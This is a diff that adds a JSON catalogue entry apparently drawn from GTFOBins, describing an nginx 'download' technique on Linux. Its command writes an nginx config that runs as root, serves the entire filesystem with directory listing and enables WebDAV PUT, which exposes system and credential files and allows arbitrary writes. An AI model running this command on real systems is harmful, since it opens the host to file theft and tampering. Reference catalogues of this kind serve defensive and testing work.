@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-nginx-download",
+  "name": "GTFOBins · nginx (download)",
+  "command": "cat >/path/to/temp-file <<EOF\nuser root;\nhttp {\n  server {\n    listen 80;\n    root /;\n    autoindex on;\n    dav_methods PUT;\n  }\n}\nevents {}\nEOF\n\nnginx -c /path/to/temp-file",
+  "description": "Use nginx to download via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "nginx",
+    "download"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/nginx/#download",
+  "upstream_id": "nginx/download/0",
+  "category": "gtfobins",
+  "subcategory": "file-download",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/nginx/"
+    }
+  ]
+}
